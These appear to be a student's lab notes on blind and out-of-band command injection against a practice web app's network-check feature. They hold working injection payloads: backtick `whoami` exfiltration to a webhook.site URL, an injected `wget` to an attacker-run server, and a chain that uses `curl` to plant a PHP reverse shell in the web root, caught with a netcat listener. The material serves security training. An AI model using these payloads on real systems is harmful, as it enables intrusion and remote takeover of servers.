## Command Injection - Blind / Out-of-Band
### Normal App Functionality
- Access the second lab
- Also a network check
- Enter `https://tcm-sec.com/` and it does not display the curl command nor the response code. It does show the target name and 'Website OK'.

- Unsucessful connection returns `Website not found' or 'Something went wrong'

### Try Payloads for Different Behavior
- Enter `https://tcm-sec.com; whoami #` returns 'Website OK' and the target as `https://tcm-sec.com whoami `
- It is likely filtering out `;` and `#`
- Since it only returns 'yes' or 'no', it is blind

### Out-of-Band Technique
- Get a `webhook.site` URL
- Enter ``https://webhook.site/b9b4e186-1f27-4dac-b4f2-911eac7325c1?`whoami` `` and webhook receies the executed command

- This is out-of-band because we have to catch it from a different place
- Set up python server `python3 -m http.server 4242`
- Enter `https://tcm-sec.com \n wget 10.0.2.15:4242/test` and we catch the response with netcat

### Reverse Shell
- Host reverse shell on python server
- Enter `https://tcm-sec.com && curl 10.0.2.15:4242/php-reverse-shell.php > /var/www/html/php-reverse-shell.php`
- Set up netcat listener `nc -lvnp 4444`
- Navigate to `localhost/php-reverse-shell.php` to execute it
- The browser hangs as it was caught by netcat!
